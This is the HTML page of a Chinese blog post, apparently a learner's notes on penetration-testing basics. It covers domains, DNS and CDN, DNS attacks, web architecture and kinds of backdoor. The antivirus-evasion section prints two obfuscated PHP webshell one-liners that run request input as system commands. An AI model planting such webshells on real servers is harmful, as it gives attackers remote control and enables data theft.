@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>渗透 | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
+document.addEventListener("DOMContentLoaded", () => {
+  renderKatex({
+    ...{},
+    ...undefined?.options,
+  });
+});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"kinsey973.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="基础域名1.什么是域名? 123相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透">
+<meta property="og:url" content="https://kinsey973.github.io/2025/06/10/%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="北歌">
+<meta property="og:description" content="基础域名1.什么是域名? 123相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506102109093.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506110828674.png">
+<meta property="article:published_time" content="2025-06-10T08:15:48.000Z">
+<meta property="article:modified_time" content="2025-07-25T01:02:53.370Z">
+<meta property="article:author" content="kinsey">
+<meta property="article:tag" content="北歌">
+<meta property="article:tag" content="Blog">
+<meta property="article:tag" content="博客">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="https:&#x2F;&#x2F;kinsey973.github.io&#x2F;">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506102109093.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">230</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">103</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-number">1.1.</span> <span class="toc-text">域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E5%92%8CCDN"><span class="toc-number">1.2.</span> <span class="toc-text">DNS和CDN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS"><span class="toc-number">1.2.1.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CDN"><span class="toc-number">1.2.2.</span> <span class="toc-text">CDN</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81DNS%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">常见DNS漏洞：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">1.3.</span> <span class="toc-text">脚本语言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEB"><span class="toc-number">1.4.</span> <span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">1.5.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-https"><span class="toc-number">1.6.</span> <span class="toc-text">http&#x2F;https</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#http"><span class="toc-number">1.6.1.</span> <span class="toc-text">http</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#https"><span class="toc-number">1.6.2.</span> <span class="toc-text">https</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95"><span class="toc-number">1.7.</span> <span class="toc-text">web源码扩展</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinsey973.github.io/2025/06/10/%E6%B8%97%E9%80%8F/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">渗透<a class="post-edit-link" href="https://github.com/kinsey973/kinsey973.github.io/tree/master/2024/05/31/hello-world_posts/渗透.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2025-06-10 16:15:48" itemprop="dateCreated datePublished" datetime="2025-06-10T16:15:48+08:00">2025-06-10</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2025-07-25 09:02:53" itemprop="dateModified" datetime="2025-07-25T09:02:53+08:00">2025-07-25</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">4.8k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">17m</span></span></span><span class="leancloud_visitors" id="/2025/06/10/%E6%B8%97%E9%80%8F/" data-flag-title="渗透"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2025/06/10/%E6%B8%97%E9%80%8F/"></span></span></a><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>1.什么是域名?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。</span><br><span class="line"></span><br><span class="line">网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数据串。</span><br></pre></td></tr></table></figure>
+
+<p>2域名在哪注册?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.Godaddy</span><br><span class="line">2.Gandi</span><br><span class="line">3.Hover</span><br><span class="line">4.Namesilo</span><br><span class="line">5.Namecheap</span><br><span class="line">6.万网</span><br></pre></td></tr></table></figure>
+
+<p>3什么是二级域名多级域名?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.顶级域名:又叫一级域名,一串字符串中间一个点隔开,例如baidu.com。顶级域名是互联网DNS等级之中的最高级的域,它保存于DNS根域的名字空间中。</span><br><span class="line"></span><br><span class="line">2.二级域名:实际上就是一个一级域名以下的主机名,一串字符串中间两个“.”隔开,例如www.baidu.com。二级域名就是最靠近顶级域名左侧的字段。</span><br><span class="line"></span><br><span class="line">3.三级域名:二级域名的子域名,特征是包含三个“.”,例如___.___.baidu.com...</span><br></pre></td></tr></table></figure>
+
+<p>4域名发现对于安全测试意义?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</span><br></pre></td></tr></table></figure>
+
+<h4 id="DNS和CDN"><a href="#DNS和CDN" class="headerlink" title="DNS和CDN"></a>DNS和CDN</h4><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>域名系统(Domain Name System,DNS)是Internet上解决网上机器命名的一种系统。 就像拜访朋友要先知道别人家怎么走一样，Internet上当一台主机要访问另外一台主机时，必须首先获知其地址，TCP&#x2F;IP中的IP地址是由四段以“.”分开的数字组成(此处以IPv4的地址为例，IPv6的地址同理)，记起来总是不如名字那么方便，所以，就采用了域名系统来管理名字和IP的对应关系。就是将域名转为ip</p>
+<p>DNS的工作流程大致如下：</p>
+<ul>
+<li>当用户在浏览器中输入域名时，DNS客户端（通常是操作系统或浏览器内置）会先查询本地缓存是否有对应IP。</li>
+<li>如果本地没有缓存，则向配置的DNS服务器发送查询请求。</li>
+<li>DNS服务器通过递归或迭代查询，逐级访问根域名服务器、顶级域名服务器和权威域名服务器，最终找到对应的IP地址。</li>
+<li>该IP地址返回给客户端，客户端随后使用这个IP地址与目标服务器建立连接，实现访问</li>
+</ul>
+<h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><p>CDN（Content Delivery Network，内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络，通过在网络各处部署节点服务器，实现将源站内容分发至所有CDN节点，使用户可以就近获得所需的内容。</p>
+<p>CDN的工作原理：</p>
+<ol>
+<li><strong>内容缓存</strong>：当用户首次请求某个内容时，CDN从源服务器获取该内容并缓存到地理位置较近的边缘节点。之后相同内容的请求直接由边缘节点响应，避免重复访问源服务器。</li>
+<li><strong>就近访问</strong>：用户请求自动被路由到最近的CDN节点，减少网络传输距离和时间。</li>
+<li><strong>动态加速</strong>：对于动态内容，CDN通过优化与源服务器之间的连接和智能路由，加快响应速度。</li>
+<li><strong>边缘逻辑计算</strong>：部分CDN支持在边缘节点运行代码，处理请求和优化内容，减轻源服务器负担。</li>
+</ol>
+<h5 id="常见DNS漏洞："><a href="#常见DNS漏洞：" class="headerlink" title="常见DNS漏洞："></a>常见DNS漏洞：</h5><p>ddos</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDoS攻击也叫做分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器。其他服务器的回复会被发送到被伪造服务器的真实地址，造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</span><br></pre></td></tr></table></figure>
+
+<p>dns缓存漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS缓存中毒攻击者给DNS服务器注入非法网络域名地址，如果服务器接受这个非法地址，那说明其缓存就被攻击了，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入服务器缓存，用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</span><br></pre></td></tr></table></figure>
+
+<p>域名劫持（dns重定向）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名劫持是通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</span><br></pre></td></tr></table></figure>
+
+<p>DNS查询嗅探</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者主要利用对DNS的配置信息获取网络环境的信息，为之后的攻击做好的准备。</span><br><span class="line"></span><br><span class="line">  针对这些情况，我们需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</span><br></pre></td></tr></table></figure>
+
+<p>ARP欺骗</p>
+<p>ARP（地址解析协议，Address Resolution Protocol）是一种用于将网络层的IP地址解析为数据链路层的物理MAC地址的协议，主要用于IPv4网络中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</span><br><span class="line"></span><br><span class="line">  ARP欺骗通常是在用户局网中，造成用户访问域名的错误指向。如果IDC机房也被ARP病毒入侵后，则也可能出现攻击者采用ARP包压制正常主机、或者压制DNS服务器，以使访问导向错误指向的情况。</span><br></pre></td></tr></table></figure>
+
+<p>本机劫持：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h4><p>常见的有asp，php，aspx，jsp，javaweb，pl，py，cgi</p>
+<h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><p>web的组成架构模型</p>
+<p>网站源码，分脚本类型，分应用方向</p>
+<p>操作系统：windows，linux</p>
+<p>中间件：apache iis tomcat nginx等</p>
+<p>数据库 access mysql mssql oracle</p>
+<p>架构漏洞安全测试的简要测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通信层</span><br><span class="line">主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</span><br><span class="line">    </span><br><span class="line">应用层</span><br><span class="line">应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</span><br><span class="line">  </span><br><span class="line">系统层</span><br><span class="line">主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</span><br><span class="line">  </span><br><span class="line">管理层</span><br><span class="line">主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关于web源码其他说明</p>
+<p>看这个网站<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/language/java/unserialize.html">https://websec.readthedocs.io/zh/latest/language/java/unserialize.html</a></p>
+<h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.网页后门 ：</span><br><span class="line">  此类后门程序一般都是服务器上正常 的web服务来构造自己的连接方式，比如现在非常流行的ASP、cgi脚本后门等。</span><br><span class="line">    </span><br><span class="line">2.线程插入后门：</span><br><span class="line">  利用系统自身的某个服务或者线程，将后门程序插入到其中，具体原理原来《黑客防线》曾具体讲解过，感兴趣的朋友可以查阅。这也是现在最流行的一个后门技术。</span><br><span class="line">      </span><br><span class="line">3.扩展后门：</span><br><span class="line">  所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有很强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用————但是，功能越强，个人觉得反而脱郭后门“隐蔽”的初衷，具体看法就看各位使用都的喜好了。</span><br><span class="line">      </span><br><span class="line">4.C/S后门（客户端服务器后门）：</span><br><span class="line">   	和传统的木马程序类似的控制方法，采用“客记端/服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>免杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">玩法（创建后门之后我们可以怎么样操作？）</span><br><span class="line">  网站后门：便于控制网站</span><br><span class="line">  软件后门：用于控制</span><br><span class="line">  服务器后门：可以进行脱库、盗取信息</span><br><span class="line">  </span><br><span class="line">免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</span><br><span class="line">由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。</span><br><span class="line">其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</span><br><span class="line"></span><br><span class="line">后门需要掌握的核心技能，防止杀毒软件检查到</span><br><span class="line"></span><br><span class="line"> &lt;?php $a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">       $b = explode(&quot;#&quot;,$a);</span><br><span class="line">       $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; </span><br><span class="line">       $c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php $a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;; $a($_REQUEST[1]); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>如何查询域名的A记录、max记录、cname记录和ns记录</p>
+<p>用nslookup，先输入nslookup，在输入 set querytype&#x3D;mx，最后输入域名就能得到域名的mx记录，其他同理</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506102109093.png" alt="image-20250610210906998" loading="lazy"></p>
+<blockquote>
+<ol>
+<li>A记录（Address Record）</li>
+</ol>
+<ul>
+<li>用途：将域名（主机名）映射到对应的IPv4地址（IP地址）。</li>
+<li>功能：当用户输入域名时，DNS通过A记录告诉用户访问的服务器的具体IP地址，实现域名到服务器的定位。</li>
+<li>例子：域名<code>www.example.com</code>的A记录指向<code>192.168.1.1</code>，用户访问<code>www.example.com</code>时，实际上访问的是该IP地址的服务器。</li>
+<li>作用：实现域名和IP地址的直接绑定，是网站访问的基础。</li>
+</ul>
+<ol start="2">
+<li>MX记录（Mail Exchange Record）</li>
+</ol>
+<ul>
+<li>用途：指定负责处理该域名邮件的邮件服务器。</li>
